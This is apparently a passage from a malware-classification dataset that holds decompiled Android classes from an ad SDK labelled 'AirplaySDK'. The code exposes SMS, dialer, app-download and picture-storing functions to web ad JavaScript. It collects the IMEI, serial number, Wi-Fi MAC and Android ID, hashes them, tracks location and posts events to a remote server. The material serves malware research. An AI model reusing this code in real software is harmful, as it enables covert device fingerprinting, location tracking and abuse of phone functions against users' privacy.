i4=a2;           i2=i10;           i5=c2;         }  catch (        Exception e2) {           if (this.d != null) {             this.d.a(e2.getMessage());           }           b(""resize"",""Error occured while parsing resizeProperties data."");           return;         }       }       if (z) {         i6=i4;         i7=i3;       }  else {         int[] a4=a(i4,i3);         i6=a4[0];         i7=a4[1];       }       FrameLayout frameLayout=(FrameLayout)getRootView().findViewById(R.id.content);       FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(i6,i7);       View view=new View(getContext());       view.setLayoutParams(getLayoutParams());       this.p=new FrameLayout(getContext());       FrameLayout.LayoutParams layoutParams2=new FrameLayout.LayoutParams(i6,i7);       layoutParams2.leftMargin=i2;       layoutParams2.topMargin=i;       this.p.setLayoutParams(layoutParams2);       this.q=(ViewGroup)getParent();       if (this.q != null) {         int childCount=this.q.getChildCount();         int i12=0;         while (i12 < childCount && this.q.getChildAt(i12) != this) {           i12++;         }         this.r=i12;         setLayoutParams(layoutParams);         this.q.removeView(this);         this.p.addView(this);         try {           LinearLayout linearLayout=new LinearLayout(getContext());           FrameLayout.LayoutParams layoutParams3=new FrameLayout.LayoutParams((int)(this.o * 50.0f),(int)(this.o * 50.0f));           layoutParams3.gravity=i5;           linearLayout.setLayoutParams(layoutParams3);           linearLayout.setGravity(i5);           this.p.addView(linearLayout);         }  catch (        Exception e3) {           e3.printStackTrace();         }         frameLayout.addView(this.p);         this.q.addView(view,this.r);         this.q.setVisibility(8);         setState(""resized"");         e(""sizeChange"");       }       if (this.d != null) {         this.d.d();       }       if (this.c != null) {         this.c.c=false;       }       g(""95"");     }  catch (    Exception e4) {       g(""89"");       e4.printStackTrace();     }   }   private int[] a(  int i,  int i2){     if (i > this.h || i2 > this.i) {       float f=i2 / i;       if (((int)((i - this.h) * f)) > ((int)((i2 - this.i) * f))) {         i=this.h;         i2=(int)(f * i);       }  else {         i2=this.h;         i=(int)(i2 / f);       }     }     return new int[]{i,i2};   }   private void setButtonBackground(  Button button){     if (button != null) {       try {         Class<?> cls=Class.forName(""com.android.internal.R$drawable"");         button.setBackgroundResource(cls.getField(""ic_menu_close_clear_cancel"").getInt(cls));       }  catch (      Exception e2) {         button.setText(""Close"");         button.setTypeface(null,1);         button.setBackgroundColor(0);       }     }   }   Button a(  int i){     Button button=new Button(getContext());     ViewGroup.LayoutParams layoutParams=new ViewGroup.LayoutParams((int)(this.o * 50.0f),(int)(this.o * 50.0f));     button.setGravity(i);     button.setLayoutParams(layoutParams);     setButtonBackground(button);     button.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         MraidView.this.c();       }     } );     return button;   }   public void c(){     try {       if (this.c != null) {         this.c.c=true;       }       if (this.m.equals(""expanded"")) {         if (this.p != null && this.q != null) {           ((ViewGroup)this.p.getParent()).removeView(this.p);           this.p.removeView(this);           setLayoutParams(this.q.getChildAt(this.r).getLayoutParams());           this.q.removeViewAt(this.r);           this.q.setVisibility(0);         }         setState(""default"");         if (this.c != null) {           this.c.getAd();         }       }  else       if (this.m.equals(""default"")) {         ((ViewGroup)getParent()).setVisibility(8);         setState(""hidden"");         if (this.e != null) {           this.e.sendEmptyMessage(-3);         }       }  else       if (this.m.equals(""resized"")) {         if (this.p != null && this.q != null) {           ((ViewGroup)this.p.getParent()).removeView(this.p);           this.p.removeView(this);           setLayoutParams(this.q.getChildAt(this.r).getLayoutParams());           this.q.removeViewAt(this.r);           this.q.setVisibility(0);         }         setState(""default"");         if (this.c != null) {           this.c.getAd();         }       }  else {         ((ViewGroup)getParent()).setVisibility(8);         setState(""hidden"");         if (this.e != null) {           this.e.sendEmptyMessage(-3);         }       }     }  catch (    Exception e2) {       e2.printStackTrace();     }     if (this.d != null) {       this.d.c();     }   }   public void c(  String str){     a(false);     o.a(""SDK LOG: inside createCalendarEvent: "" + str);     if (this.d != null) {       this.d.e();     }     if (str != null) {       try {         if (!str.equals("""")) {           Intent intent=new Intent(getContext(),(Class<?>)BrowserActivity.class);           intent.setAction(""newCalendarEvent"");           intent.addFlags(268435456);           intent.addFlags(8388608);           intent.putExtra(""json"",str);           getContext().startActivity(intent);         }       }  catch (      Exception e2) {         e2.printStackTrace();         g(""89"");         b(""createCalendarEvent"",""Error occured in createCalenderEvent."");         Log.e(""AirplayMraid"",""Error occured in createCalenderEvent."");         return;       }     }     b(""createCalendarEvent"",""Calender method called with empty json."");     Log.e(""AirplayMraid"",""Error occured while creating calendar event."");   }   public void d(  String str){     a(false);     try {       if (this.d != null) {         this.d.e();       }       Intent intent=new Intent(getContext(),(Class<?>)BrowserActivity.class);       intent.setAction(""playVideo"");       intent.putExtra(""url"",str);       intent.addFlags(8388608);       intent.addFlags(268435456);       getContext().startActivity(intent);     }  catch (    Exception e2) {       e2.printStackTrace();       g(""89"");     }   }   public void a(  String str,  String str2){     a(false);     try {       if (this.d != null) {         this.d.e();       }       if (str == null || str.equals("""")) {         b(""storePicture"",""Image url is null."");         return;       }       if (str2 == null || str2.equals("""")) {         b(""storePicture"",""File name is null."");         return;       }       if (getContext() instanceof Activity) {         AlertDialog.Builder builder=new AlertDialog.Builder(getContext());         builder.setMessage(""This image will be added in gallery. Please confirm ?"");         builder.setPositiveButton(""Yes"",new AnonymousClass2(str,str2));         builder.setNegativeButton(""No"",new DialogInterface.OnClickListener(){           @Override public void onClick(          DialogInterface dialogInterface,          int i){             dialogInterface.dismiss();             MraidView.this.b(""storePicture"",""User has canceled."");             if (MraidView.this.d != null) {               MraidView.this.d.c();             }             MraidView.this.a(true);           }         } );         builder.setOnCancelListener(new DialogInterface.OnCancelListener(){           @Override public void onCancel(          DialogInterface dialogInterface){             dialogInterface.dismiss();             MraidView.this.b(""storePicture"",""User has canceled."");             if (MraidView.this.d != null) {               MraidView.this.d.c();             }             MraidView.this.a(true);           }         } );         builder.setCancelable(false);         builder.show();       }     }  catch (    Exception e2) {       b(""storePicture"",""Error occured while storing picture."");       g(""error"");       if (this.d != null) {         this.d.c();       }       a(true);     }   } public class AnonymousClass2 implements DialogInterface.OnClickListener {     final String a;     final String b;     AnonymousClass2(    String str,    String str2){       this.a=str;       this.b=str2;     }     @Override public void onClick(    DialogInterface dialogInterface,    int i){       dialogInterface.dismiss();       new Thread(new Runnable(){         @Override public void run(){           try {             HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(AnonymousClass2.this.a).openConnection();             httpURLConnection.setDoInput(true);             httpURLConnection.connect();             Bitmap decodeStream=BitmapFactory.decodeStream(httpURLConnection.getInputStream());             File file=new File(MraidView.this.getContext().getApplicationInfo().dataDir,AnonymousClass2.this.b);             Log.i(""TAG"",""file: "" + file.getAbsolutePath());             FileOutputStream fileOutputStream=new FileOutputStream(file);             decodeStream.compress(Bitmap.CompressFormat.JPEG,85,fileOutputStream);             fileOutputStream.flush();             fileOutputStream.close();           }  catch (          IOException e) {             e.printStackTrace();           }           try {             MediaStore.Images.Media.insertImage(MraidView.this.getContext().getContentResolver(),MraidView.this.getContext().getApplicationInfo().dataDir + ""/"" + AnonymousClass2.this.b,""My Image"",AnonymousClass2.this.b);             MraidView.this.post(new Runnable(){               @Override public void run(){                 MraidView.this.g(""93"");                 Log.i(""AirplayMraid"",""Ad image is saved in Gallery."");                 MraidView.this.a(true);               }             } );           }  catch (          FileNotFoundException e2) {             MraidView.this.post(new Runnable(){               @Override public void run(){                 MraidView.this.b(""storePicture"",""Url does not exist."");                 MraidView.this.a(true);               }             } );             e2.printStackTrace();           } catch (          Exception e3) {             MraidView.this.post(new Runnable(){               @Override public void run(){                 MraidView.this.b(""storePicture"",""Unknown error occured: "" + e3.getMessage());                 if (MraidView.this.d != null) {                   MraidView.this.d.c();                 }                 MraidView.this.a(true);               }             } );             e3.printStackTrace();           }         }       } ).start();     }   }   public void e(  String str){     f(""mraid.triggerEvent('"" + str + ""');"");   }   public void b(  String str,  String str2){     f(""mraid.triggerErrorEvent("" + str + "",'""+ str2+ ""');"");     if (!this.b) {       g(""error"");     }   }   public void d(){     try {       int b2=(int)o.b(getWidth(),getContext());       int b3=(int)o.b(getHeight(),getContext());       int x=Build.VERSION.SDK_INT > 10 ? (int)getX() : getLeft();       int top=getTop();       if (Build.VERSION.SDK_INT > 10) {         top=(int)getY();       }       JSONObject jSONObject=new JSONObject();       jSONObject.put(""x"",x);       jSONObject.put(""y"",top);       jSONObject.put(""width"",b2);       jSONObject.put(""height"",b3);       f(""mraid.setCurrentPosition("" + jSONObject + "");"");     }  catch (    Exception e2) {       b(""setCurrentPosition"",""Error occured while setting current position."");       e2.printStackTrace();     }   }   public void e(){     try {       int b2=(int)o.b(getWidth(),getContext());       int b3=(int)o.b(getHeight(),getContext());       int x=Build.VERSION.SDK_INT > 10 ? (int)getX() : getLeft();       int top=getTop();       if (Build.VERSION.SDK_INT > 10) {         top=(int)getY();       }       JSONObject jSONObject=new JSONObject();       jSONObject.put(""x"",x);       jSONObject.put(""y"",top);       jSONObject.put(""width"",b2);       jSONObject.put(""height"",b3);       f(""mraid.setDefaultPosition("" + jSONObject + "");"");     }  catch (    Exception e2) {       b(""setDefaultPosition"",""Error occured while setting default position."");       e2.printStackTrace();     }   }   public void f(){     try {       int i=this.j;       int b2=(int)o.b(this.g.heightPixels - getTokenSize(),getContext());       JSONObject jSONObject=new JSONObject();       jSONObject.put(""width"",i);       jSONObject.put(""height"",b2);       f(""mraid.setMaxSize("" + jSONObject + "");"");     }  catch (    Exception e2) {       b(""setMaxSize"",""Error occured while setting max size."");       e2.printStackTrace();     }   }   private int getTokenSize(){     Rect rect=new Rect();     Window window=((Activity)getContext()).getWindow();     window.getDecorView().getWindowVisibleDisplayFrame(rect);     int i=rect.top;     int top=window.findViewById(R.id.content).getTop() - i;     o.a(""StatusBar Height= "" + i + "" , TitleBar Height = ""+ top);     return top + i;   }   public void g(){     try {       JSONObject jSONObject=new JSONObject();       jSONObject.put(""width"",this.j);       jSONObject.put(""height"",this.k);       f(""mraid.setScreenSize("" + jSONObject + "");"");     }  catch (    Exception e2) {       b(""setScreenSize"",""Error occured while setting screen size."");       e2.printStackTrace();     }   }   public void h(){     try {       Activity activity=(Activity)getContext();       String b2=this.t.b();       Configuration configuration=getResources().getConfiguration();       boolean c2=this.t.c();       if (b2 != null && b2.equals(""landscape"")) {         activity.setRequestedOrientation(0);         configuration.orientation=2;         activity.onConfigurationChanged(configuration);         o.a(""Orientation cahnged to landscape."");       }  else       if (b2 != null && b2.equals(""portrait"")) {         activity.setRequestedOrientation(1);         o.a(""Orientation changed to protrait."");       }  else       if (b2 != null && b2.equals(""none"")) {         activity.setRequestedOrientation(-1);         o.a(""Orientation changed to none."");       }       if (!c2) {         activity.setRequestedOrientation(activity.getRequestedOrientation());         activity.onConfigurationChanged(configuration);         o.a(""Orientation changed to false."");       }       o.a(""Orientation saved."");     }  catch (    Exception e2) {       e2.printStackTrace();     }   }   public void i(){     JSONObject s=o.s(getContext());     if (s != null) {       f(""mraid.setSupportedFeatures("" + s + "");"");     }  else {       b(""supports"",""Error occured in supports."");     }   }   public void f(  final String str){     post(new Runnable(){       @Override public void run(){         MraidView.this.loadUrl(""javascript:"" + str);       }     } );   }   public void setState(  String str){     this.m=str;     f(""mraid.setState('"" + str + ""');"");   }   public void setViewable(  boolean z){     f(""mraid.setViewable("" + z + "");"");   } public class c {     boolean a=false;     c(){     }     String a(){       JSONObject jSONObject=new JSONObject();       try {         jSONObject.put(""width"",MraidView.this.j);         jSONObject.put(""height"",MraidView.this.k);         jSONObject.put(""useCustomClose"",this.a);         jSONObject.put(""isModal"",true);       }  catch (      JSONException e) {         e.printStackTrace();       }       return jSONObject.toString();     }     void a(    String str){       int i;       int i2;       try {         JSONObject jSONObject=new JSONObject(str);         MraidView mraidView=MraidView.this;         if (jSONObject.isNull(""width"")) {           i=MraidView.this.j;         }  else {           i=jSONObject.getInt(""width"");         }         mraidView.h=i;         MraidView mraidView2=MraidView.this;         if (jSONObject.isNull(""height"")) {           i2=MraidView.this.k;         }  else {           i2=jSONObject.getInt(""height"");         }         mraidView2.i=i2;         this.a=jSONObject.isNull(""useCustomClose"") ? false : jSONObject.getBoolean(""useCustomClose"");       }  catch (      JSONException e) {         e.printStackTrace();       } catch (      Exception e2) {         MraidView.this.b(""setExpandProperties"",""An error occured while parsing expand properties json;"");       }     }   } public class d extends h {     public d(){     }     @Override @JavascriptInterface public void printJSLog(    String str){       Log.i(""AirplayMraid"",""JS Log: "" + str);     }     @JavascriptInterface public void expand(){       expand("""");     }     @JavascriptInterface public void expand(    final String str){       MraidView.this.post(new Runnable(){         @Override public void run(){           MraidView.this.b(str);         }       } );     }     @JavascriptInterface public void close(){       MraidView.this.post(new Runnable(){         @Override public void run(){           MraidView.this.c();         }       } );     }     @Override @JavascriptInterface public void open(    String str){       if (MraidView.this.d != null) {         MraidView.this.d.e();       }       Intent intent=new Intent(MraidView.this.getContext(),(Class<?>)BrowserActivity.class);       intent.setAction(""browser"");       intent.addFlags(268435456);       intent.addFlags(8388608);       intent.putExtra(""url"",str);       try {         MraidView.this.getContext().startActivity(intent);         MraidView.this.g(""96"");       }  catch (      ActivityNotFoundException e) {         Log.e(""AirplayMraid"",""Required BrowserActivty is not added in manifest please add."");         if (MraidView.this.d != null) {           MraidView.this.d.a(""Required BrowserActivty is not added in manifest please add."");         }         MraidView.this.g(""89"");       }       MraidView.this.a(true);     }     @Override @JavascriptInterface public void setExpandProperties(    String str){       o.a(""Expand Json: "" + str);       if (MraidView.this.l != null) {         MraidView.this.l.a(str);         return;       }       MraidView.this.l=new c();       MraidView.this.l.a(str);     }     @Override @JavascriptInterface public void setResizeProperties(    String str){       if (MraidView.this.t != null) {         MraidView.this.t.a(str);       }     }     @JavascriptInterface public void resize(){       MraidView.this.post(new Runnable(){         @Override public void run(){           MraidView.this.b();         }       } );     }     @JavascriptInterface public void playVideo(    final String str){       MraidView.this.post(new Runnable(){         @Override public void run(){           MraidView.this.d(str);         }       } );     }     @JavascriptInterface public void storePicture(    final String str,    final String str2){       MraidView.this.post(new Runnable(){         @Override public void run(){           MraidView.this.a(str,str2);         }       } );     }     @JavascriptInterface public void createCalendarEvent(    final String str){       MraidView.this.post(new Runnable(){         @Override public void run(){           MraidView.this.c(str);         }       } );     }     @Override @JavascriptInterface public void setOrientationProperties(    String str){       o.a(""Orientation json: "" + str);       try {         JSONObject jSONObject=new JSONObject(str);         boolean z=jSONObject.isNull(""allowOrientationChange"") ? true : jSONObject.getBoolean(""allowOrientationChange"");         MraidView.this.t.b(jSONObject.isNull(""forceOrientation"") ? ""none"" : jSONObject.getString(""forceOrientation""));         MraidView.this.t.a(z);         MraidView.this.post(new Runnable(){           @Override public void run(){             MraidView.this.h();           }         } );       }  catch (      Exception e) {         MraidView.this.b(""setOrientationProperties"",""Error occured in while parsing orientation json."");       }     }     @Override @JavascriptInterface public void showDialer(    String str){       Log.i(""AirplayMraid"",""Showing dialer....."");       try {         if (MraidView.this.d != null) {           MraidView.this.d.e();         }       }  catch (      ActivityNotFoundException e) {         MraidView.this.b(""showDialer"",""Error occurred while dialing number."");         Log.e(""AirplayMraid"",""Error whlie displaying push ad......: "" + e.getMessage());         MraidView.this.g(""89"");       }       if (str == null || str.equals("""")) {         MraidView.this.b(""showDialer"",""Phone numer is null."");         return;       }       Intent intent=new Intent(""android.intent.action.DIAL"",Uri.parse(""tel:"" + str));       intent.addFlags(268435456);       intent.addFlags(8388608);       MraidView.this.getContext().startActivity(intent);       MraidView.this.g(""97"");       MraidView.this.a(true);     }     @Override @JavascriptInterface public void sendSms(    String str,    String str2){       Log.i(""AirplayMraid"",""Sending SMS....."");       try {         if (MraidView.this.d != null) {           MraidView.this.d.e();         }       }  catch (      Exception e) {         Log.e(""AirplayMraid"",""Error whlie displaying push ad......: "" + e.getMessage());         MraidView.this.b(""sendSms"",""Error occurred while sending message"");         MraidView.this.g(""error"");       }       if (str == null || str.equals("""")) {         MraidView.this.b(""sendSms"",""Numer is null."");         return;       }       if (str2 == null || str2.equals("""")) {         MraidView.this.b(""sendSms"",""SMS text is null."");         return;       }       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.addFlags(268435456);       intent.setType(""vnd.android-dir/mms-sms"");       intent.putExtra(""address"",str);       intent.putExtra(""sms_body"",str2);       MraidView.this.getContext().startActivity(intent);       MraidView.this.g(""98"");       MraidView.this.a(true);     }     @Override @JavascriptInterface public void downloadApp(    String str){       try {         if (MraidView.this.d != null) {           MraidView.this.d.e();         }         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));         intent.setFlags(268435456);         intent.addFlags(8388608);         MraidView.this.getContext().startActivity(intent);         MraidView.this.g(""77"");       }  catch (      Exception e) {         Log.e(""AirplayMraid"",""Error whlie displaying App......: "" + e.getMessage());         MraidView.this.b(""downloadApp"",""Error occurred while redirecting to market."");         MraidView.this.g(""error"");       }       MraidView.this.a(true);     }     @Override @JavascriptInterface public void showLocation(    String str,    String str2){       try {         if (MraidView.this.d != null) {           MraidView.this.d.e();         }         Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(String.format(Locale.ENGLISH,""geo:%f,%f"",str,str2)));         intent.setFlags(268435456);         intent.addFlags(8388608);         MraidView.this.getContext().startActivity(intent);         MraidView.this.g(""79"");       }  catch (      Exception e) {         Log.e(""AirplayMraid"",""Error occurred whlie displaying Location......: "" + e.getMessage());         MraidView.this.b(""showLoaction"",""Error occurred while showing location."");         MraidView.this.g(""error"");       }       MraidView.this.a(true);     }   } public class a extends WebViewClient {     boolean a=false;     a(){     }     @Override public void onPageFinished(    WebView webView,    String str){       super.onPageFinished(webView,str);       if (!this.a) {         if (MraidView.this.m == null || (MraidView.this.m != ""expanded"" && MraidView.this.m != ""resized"")) {           MraidView.this.a();         }         if (MraidView.this.d != null) {           MraidView.this.d.b();         }         MraidView.this.l();       }     }     @Override public void onReceivedError(    WebView webView,    int i,    String str,    String str2){       this.a=true;       super.onReceivedError(webView,i,str,str2);       if (MraidView.this.d != null) {         MraidView.this.d.a(str);       }       if (MraidView.this.e != null) {         MraidView.this.e.sendEmptyMessage(-4);       }     }   } public class b extends WebChromeClient {     private b(){     }     @Override public void onShowCustomView(    View view,    WebChromeClient.CustomViewCallback customViewCallback){       super.onShowCustomView(view,customViewCallback);       if (view instanceof FrameLayout) {         FrameLayout frameLayout=(FrameLayout)view;         if (frameLayout.getFocusedChild() instanceof VideoView) {           MraidView.this.s=(VideoView)((FrameLayout)view).getFocusedChild();           frameLayout.removeView(MraidView.this.s);           ((ViewGroup)MraidView.this.getParent()).addView(MraidView.this.s);           MraidView.this.s.setOnCompletionListener(new MediaPlayer.OnCompletionListener(){             @Override public void onCompletion(            MediaPlayer mediaPlayer){               try {                 mediaPlayer.stop();                 MraidView.this.g(""99"");                 MraidView.this.a(true);               }  catch (              Exception e) {               }             }           } );           MraidView.this.s.setOnErrorListener(new MediaPlayer.OnErrorListener(){             @Override public boolean onError(            MediaPlayer mediaPlayer,            int i,            int i2){               MraidView.this.g(""89"");               MraidView.this.a(true);               return false;             }           } );           MraidView.this.s.start();           MraidView.this.a(false);         }       }     }     @Override public void onHideCustomView(){       if (MraidView.this.s != null) {         ((ViewGroup)MraidView.this.getParent()).removeView(MraidView.this.s);         if (MraidView.this.s.isPlaying()) {           MraidView.this.s.stopPlayback();         }       }       MraidView.this.a(true);     }   }   public final void g(  final String str){ synchronized (str) {       if (this.b) {         o.a(""Ad in test mode. Sending ignored."");       }  else       if (o.o(getContext())) {         new Thread(new Runnable(){           @Override public void run(){             try {               Log.i(""AirplayMraid"",""Sending event: "");               if (MraidView.this.w.f() || !str.equals(""89"")) {                 String g=MraidView.this.w.g();                 if (g.contains(""%event%"")) {                   g=g.replace(""%event%"",str);                 }                 o.a(""URL: "" + g);                 DefaultHttpClient defaultHttpClient=new DefaultHttpClient();                 HttpPost httpPost=new HttpPost(g);                 BasicHttpParams basicHttpParams=new BasicHttpParams();                 httpPost.setParams(basicHttpParams);                 HttpConnectionParams.setConnectionTimeout(basicHttpParams,Constants.HTTP_TIMEOUT);                 HttpConnectionParams.setSoTimeout(basicHttpParams,10000);                 HttpResponse execute=defaultHttpClient.execute(httpPost);                 int statusCode=execute == null ? 0 : execute.getStatusLine().getStatusCode();                 Log.i(""AirplayMraid"",""Status code: "" + statusCode);                 if (statusCode == 200) {                   Log.i(""AirplayMraid"",""MRAID Data: "" + EntityUtils.toString(execute.getEntity()));                   return;                 }                 return;               }               o.a(""Error reporting is off."");             }  catch (            Exception e2) {               Log.e(""AirplayMraid"",""Exception: "" + e2.getMessage());               e2.printStackTrace();             }           }         } ,""mraid_event"").start();       }     }   }   public void a(  boolean z){     if (this.c != null) {       if (z && this.m != null && (!this.m.equalsIgnoreCase(""expanded"") || !this.m.equalsIgnoreCase(""resized""))) {         this.c.c=true;         if (this.f != null && this.f.equals(AdView.PLACEMENT_TYPE_INLINE) && this.c != null) {           this.c.getAd();           return;         }         return;       }       this.c.c=false;     }   } public static class e {     private String b;     private boolean d;     private String a="""";     private boolean c=false;     public String a(){       return this.a;     }     public void a(    String str){       this.a=str;     }     public String b(){       return this.b;     }     public void b(    String str){       this.b=str;     }     public void a(    boolean z){       this.d=z;     }     public boolean c(){       return this.d;     }     public int c(    String str){       if (str.equals(""top-right"")) {         return 53;       }       if (str.equals(""bottom-center"")) {         return 81;       }       if (str.equals(""bottom-left"")) {         return 83;       }       if (str.equals(""bottom-right"")) {         return 85;       }       if (str.equals(""center"")) {         return 17;       }       if (str.equals(""top-center"")) {         return 49;       }       return str.equals(""top-left"") ? 51 : 53;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\n.code","class n {   private Context a;   private Location b;   public n(  Context context){     this.a=context;   }   public String a(){     try {       String deviceId=((TelephonyManager)this.a.getSystemService(""phone"")).getDeviceId();       if (deviceId == null || deviceId.equals("""")) {         Class<?> cls=Class.forName(""android.os.SystemProperties"");         deviceId=(String)cls.getMethod(""get"",String.class).invoke(cls,""ro.serialno"");         o.j(""SERIAL"");         if (deviceId == null || deviceId.equals("""")) {           if (this.a.getPackageManager().checkPermission(""android.permission.ACCESS_WIFI_STATE"",o.e(this.a)) == 0) {             WifiManager wifiManager=(WifiManager)this.a.getSystemService(""wifi"");             System.out.println(""WIFI "" + wifiManager.isWifiEnabled());             deviceId=wifiManager.getConnectionInfo().getMacAddress();             o.j(""WIFI_MAC"");           }  else {             deviceId=new a(this.a).a().toString();             o.j(""UUID"");           }         }       }  else {         o.j(""IMEI"");       }       return deviceId;     }  catch (    Exception e) {       e.printStackTrace();       return ""invalid"";     }   }   public boolean b(){     boolean z=false;     try {       String a2=a();       if (a2 == null || a2.equals("""") || a2.equals(""invalid"")) {         o.a(""Can not get device unique id."");       }  else {         MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");         messageDigest.update(a2.getBytes(),0,a2.length());         o.c(new BigInteger(1,messageDigest.digest()).toString(16));         z=d();       }     }  catch (    NoSuchAlgorithmException e) {       Log.e(""AirplaySDK"",""Error occured while converting details to md5."" + e.getMessage());     } catch (    Exception e2) {       e2.printStackTrace();       Log.e(""AirplaySDK"",""Error occured while converting details to md5."");     }     return z;   }   private boolean d(){     boolean z=true;     try {       String a2=a();       if (a2 == null || a2.equals("""") || a2.equals(""invalid"")) {         o.a(""Can not get device unique id."");         z=false;       }  else {         MessageDigest messageDigest=MessageDigest.getInstance(""SHA-1"");         messageDigest.update(a2.getBytes(),0,a2.length());         o.d(new BigInteger(1,messageDigest.digest()).toString(16));       }       return z;     }  catch (    NoSuchAlgorithmException e) {       Log.e(""AirplaySDK"",""Error occured while converting details to SHA-1."" + e.getMessage());       return false;     } catch (    Exception e2) {       e2.printStackTrace();       Log.e(""AirplaySDK"",""Error occured while converting details to SHA-1."");       return false;     }   } public class a {     protected static final String PREFS_DEVICE_ID=""device_id"";     protected static final String PREFS_FILE=""device_id.xml"";     protected UUID a;     public a(    Context context){       if (this.a == null) { synchronized (a.class) {           if (this.a == null) {             SharedPreferences sharedPreferences=context.getSharedPreferences(PREFS_FILE,0);             String string=sharedPreferences.getString(PREFS_DEVICE_ID,null);             if (string != null) {               this.a=UUID.fromString(string);             }  else {               String string2=Settings.Secure.getString(context.getContentResolver(),""android_id"");               try {                 if (!""9774d56d682e549c"".equals(string2)) {                   this.a=UUID.nameUUIDFromBytes(string2.getBytes(""utf8""));                 }  else {                   String deviceId=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();                   this.a=deviceId != null ? UUID.nameUUIDFromBytes(deviceId.getBytes(""utf8"")) : UUID.randomUUID();                 }                 sharedPreferences.edit().putString(PREFS_DEVICE_ID,this.a.toString()).commit();               }  catch (              UnsupportedEncodingException e) {                 throw new RuntimeException(e);               }             }           }         }       }     }     public UUID a(){       return this.a;     }   }   public Location c(){     String str;     o.a(""fetching Location."");     try {     }  catch (    Exception e) {       o.b(""Error occured while fetching location. "" + e.getMessage());     } catch (    Throwable th) {       Log.e(""AirplaySDK"",""Error in location: "" + th.getMessage());     }     if (!o.h().equals(""0"") || o.j() + 900000 > System.currentTimeMillis()) {       return null;     } synchronized (this.a) {       if (!o.h().equals(""0"") || o.j() + 900000 > System.currentTimeMillis()) {         o.a(""failed in last"");         return null;       }       boolean z=this.a.getPackageManager().checkPermission(""android.permission.ACCESS_COARSE_LOCATION"",this.a.getPackageName()) == 0;       boolean z2=this.a.getPackageManager().checkPermission(""android.permission.ACCESS_FINE_LOCATION"",this.a.getPackageName()) == 0;       if (z && z2) {         final LocationManager locationManager=(LocationManager)this.a.getSystemService(""location"");         if (locationManager == null) {           o.a(""Location manager null"");           return null;         }         Criteria criteria=new Criteria();         criteria.setCostAllowed(false);         if (z) {           criteria.setAccuracy(2);           str=locationManager.getBestProvider(criteria,true);         }  else {           str=null;         }         if (str == null && z2) {           criteria.setAccuracy(1);           str=locationManager.getBestProvider(criteria,true);         }         if (str == null) {           o.a(""Provider null"");           return null;         }         this.b=locationManager.getLastKnownLocation(str);         if (this.b != null) {           o.a(""Location found via get last known location."");           return this.b;         }         o.a(System.currentTimeMillis());         locationManager.requestLocationUpdates(str,0L,0.0f,new LocationListener(){           @Override public void onLocationChanged(          Location location){             o.a(System.currentTimeMillis());             n.this.b=location;             locationManager.removeUpdates(this);           }           @Override public void onProviderDisabled(          String str2){           }           @Override public void onProviderEnabled(          String str2){           }           @Override public void onStatusChanged(          String str2,          int i,          Bundle bundle){           }         } ,this.a.getMainLooper());       }  else {         o.a(""Location permission not found."");       }       return this.b;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\o.code","public class o {   private static final int NETWORK_TYPE_EHRPD=14;   private static final int NETWORK_TYPE_EVDO_B=12;   private static final int NETWORK_TYPE_HSDPA=8;   private static final int NETWORK_TYPE_HSPA=10;   private static final int NETWORK_TYPE_HSPAP=15;   private static final int NETWORK_TYPE_HSUPA=9;   private static final int NETWORK_TYPE_IDEN=11;   private static final int NETWORK_TYPE_LTE=13;   private static String a;   private static String b;   private static String d;   private static String g;   private static String h;   private static String c=""airplay"";   private static String e=""0"";   private static String f=""0"";   private static long i=0;   private static String j=""0"";   public static void a(  Context context){   }   public static String a(){     return ""6.1"";   }   public static void a(  String str){   }   public static void b(  String str){     Log.d(""System.out"","" "" + str);   }   public static String b(){     return j;   }   public static boolean b(  Context context){     DisplayMetrics displayMetrics=context.getApplicationContext().getResources().getDisplayMetrics();     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     int width=defaultDisplay.getWidth();     int height=defaultDisplay.getHeight();     float f2=displayMetrics.density;     if (width / f2 >= 600.0f && height / f2 >= 600.0f) {       return true;     }     return false;   }   public static String c(){     return a;   }   public static void c(  String str){     a=str;   }   public static String d(){     return b;   }   public static void d(  String str){     b=str;   }   public static String e(){     return c;   }   public static void e(  String str){     c=str;   }   public static String f(){     return d;   }   public static void f(  String str){     d=str;   }   public static void g(  String str){     g=str;   }   public static String g(){     return g;   }   public static String h(){     return f;   }   public static void h(  String str){     f=str;   }   public static String i(){     return e;   }   public static void i(  String str){     e=str;   }   public static void a(  long j2){     i=j2;   }   public static long j(){     return i;   }   public static String k(){     try {       SimpleDateFormat simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"");       return """" + simpleDateFormat.format(new Date()) + ""_""+ simpleDateFormat.getTimeZone().getDisplayName()+ ""_""+ simpleDateFormat.getTimeZone().getID()+ ""_""+ simpleDateFormat.getTimeZone().getDisplayName(false,0);     }  catch (    Exception e2) {       return ""00"";     }   }   public static String l(){     return Build.MODEL;   }   public static String m(){     return """" + Build.VERSION.SDK_INT;   }   public static String c(  Context context){     if (context == null) {       return """";     }     try {       String string=Settings.Secure.getString(context.getApplicationContext().getContentResolver(),""android_id"");       a(""Android ID: "" + string);       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       messageDigest.update(string.getBytes(),0,string.length());       return new BigInteger(1,messageDigest.digest()).toString(16);     }  catch (    NullPointerException e2) {       Log.e(""AirplaySDK"",""Android Id not found."");       return ""NOT FOUND"";     } catch (    NoSuchAlgorithmException e3) {       e3.printStackTrace();       return ""NOT FOUND"";     } catch (    Exception e4) {       e4.printStackTrace();       return ""NOT FOUND"";     }   }   public static String d(  Context context){     if (context == null) {       return """";     }     try {       String string=Settings.Secure.getString(context.getApplicationContext().getContentResolver(),""android_id"");       MessageDigest messageDigest=MessageDigest.getInstance(""SHA-1"");       messageDigest.update(string.getBytes(),0,string.length());       return new BigInteger(1,messageDigest.digest()).toString(16);     }  catch (    NullPointerException e2) {       Log.e(""AirplaySDK"",""Android Id not found."");       